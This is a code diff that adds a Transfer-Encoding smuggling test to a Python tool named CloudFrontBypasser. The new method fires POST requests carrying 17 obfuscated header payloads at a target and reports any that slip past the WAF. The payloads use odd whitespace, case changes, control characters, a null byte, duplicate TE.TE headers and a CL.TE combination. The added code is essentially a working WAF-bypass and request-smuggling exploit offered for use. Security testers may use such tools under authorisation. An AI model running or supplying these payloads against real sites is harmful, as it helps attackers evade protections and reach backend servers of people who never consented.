@@ -176,6 +176,7 @@ class CloudFrontBypasser:
             self._test_encoding_bypass,
             self._test_method_bypass,
             self._test_content_type_bypass,
+            self._test_transfer_encoding_smuggling,
             self._test_http2_downgrade,
             self._test_websocket_upgrade,
             self._test_range_header,
@@ -550,6 +551,112 @@ class CloudFrontBypasser:
                 print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
         
         return results
+    
+    def _test_transfer_encoding_smuggling(self) -> List[Dict[str, Any]]:
+        """
+        Test Transfer-Encoding smuggling bypass
+        
+        This technique exploits parsing differences between CloudFront/WAF layer
+        and backend servers when handling Transfer-Encoding headers. Many WAFs
+        fail to properly normalize or detect obfuscated Transfer-Encoding headers.
+        """
+        results = []
+        
+        variations = [
+            # Standard chunked encoding
+            {
+                'Transfer-Encoding': 'chunked',
+                'X-Technique': 'Transfer-Encoding: chunked'
+            },
+            # Obfuscated with whitespace
+            {
+                'Transfer-Encoding': ' chunked',
+                'X-Technique': 'Transfer-Encoding: [space]chunked'
+            },
+            {
+                'Transfer-Encoding': 'chunked ',
+                'X-Technique': 'Transfer-Encoding: chunked[space]'
+            },
+            # Case variation
+            {
+                'Transfer-Encoding': 'ChUnKeD',
+                'X-Technique': 'Transfer-Encoding: ChUnKeD (case variation)'
+            },
+            # Multiple Transfer-Encoding headers (TE.TE smuggling)
+            {
+                'Transfer-Encoding': 'chunked',
+                'Transfer-encoding': 'identity',
+                'X-Technique': 'Transfer-Encoding: Duplicate headers (TE.TE)'
+            },
+            # Vertical tab obfuscation
+            {
+                'Transfer-Encoding': 'chunked\x0b',
+                'X-Technique': 'Transfer-Encoding: chunked[vertical-tab]'
+            },
+            # Newline obfuscation
+            {
+                'Transfer-Encoding': 'chunked\n',
+                'X-Technique': 'Transfer-Encoding: chunked[newline]'
+            },
+            # Carriage return obfuscation
+            {
+                'Transfer-Encoding': 'chunked\r',
+                'X-Technique': 'Transfer-Encoding: chunked[CR]'
+            },
+            # Tab character
+            {
+                'Transfer-Encoding': 'chunked\t',
+                'X-Technique': 'Transfer-Encoding: chunked[tab]'
+            },
+            # Multiple whitespace characters
+            {
+                'Transfer-Encoding': '  chunked  ',
+                'X-Technique': 'Transfer-Encoding: [spaces]chunked[spaces]'
+            },
+            # Comma-separated encoding
+            {
+                'Transfer-Encoding': 'chunked, identity',
+                'X-Technique': 'Transfer-Encoding: chunked, identity'
+            },
+            # Invalid but parseable variations
+            {
+                'Transfer-Encoding': 'xchunked',
+                'X-Technique': 'Transfer-Encoding: xchunked (typo)'
+            },
+            {
+                'Transfer-Encoding': 'chunked;',
+                'X-Technique': 'Transfer-Encoding: chunked; (semicolon)'
+            },
+            # Combined with Content-Length (CL.TE smuggling attempt)
+            {
+                'Transfer-Encoding': 'chunked',
+                'Content-Length': '0',
+                'X-Technique': 'CL.TE Smuggling: Both headers present'
+            },
+            # Obfuscated header name
+            {
+                'Transfer-encoding': 'chunked',
+                'X-Technique': 'transfer-encoding: chunked (lowercase header)'
+            },
+            {
+                'TRANSFER-ENCODING': 'chunked',
+                'X-Technique': 'TRANSFER-ENCODING: chunked (uppercase header)'
+            },
+            # Unicode normalization issues
+            {
+                'Transfer-Encoding': 'chunked\x00',
+                'X-Technique': 'Transfer-Encoding: chunked[null-byte]'
+            },
+        ]
+        
+        for headers in variations:
+            result = self._test_request(headers, method='POST')
+            if result and result['bypass']:
+                results.append(result)
+                print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
+        
+        return results
+
     
     def _test_http2_downgrade(self) -> List[Dict[str, Any]]:
         """Test HTTP/2 to HTTP/1.1 downgrade bypass"""
